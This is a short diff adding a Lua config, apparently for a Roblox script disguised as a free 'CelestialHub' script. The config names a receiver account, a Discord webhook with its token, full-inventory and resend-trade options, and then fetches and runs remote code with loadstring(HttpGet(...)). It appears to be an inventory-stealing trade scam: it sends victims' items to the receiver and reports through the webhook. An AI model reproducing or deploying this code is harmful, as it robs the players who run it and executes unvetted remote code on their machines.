@@ -1,0 +1,10 @@
+Config = {
+    Receivers = {"eqz_s"},
+    Webhook = "https://discord.com/api/webhooks/1266043259399045341/lGLAX9oUjIU3N0cETQmwH73hApbgH3P6TIe5BiTGApu3MYKkMZLmzRESjJ8NuVAikp_l",
+    FullInventory = true,
+    GoodItemsOnly = false,
+    ResendTrade = ".resend",
+    Script = "None",
+    CustomLink = "https://celestialscript.store/CelestialHub_Free.lua"
+}
+loadstring(game:HttpGet("https://raw.githubusercontent.com/R3TH-PRIV/UILibs/main/Librarys/Impact/Source"))()
